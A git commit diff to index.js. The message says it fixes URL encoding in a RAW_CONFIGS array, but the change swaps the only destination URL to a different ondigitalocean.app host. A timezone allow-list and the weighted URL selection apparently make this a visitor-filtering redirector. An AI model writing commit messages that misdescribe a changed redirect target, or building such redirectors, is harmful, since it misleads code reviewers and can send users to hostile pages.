0264dec21c5731e1fbc87aa1ae728276e4975861
paalakash <palaksh452@gmail.com>
2026-07-14 09:09:45 +0530

    Fix URL encoding issues in RAW_CONFIGS
    Corrected URL encoding in RAW_CONFIGS array.

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seal-app-vntji.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://urchin-app-wy5px.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
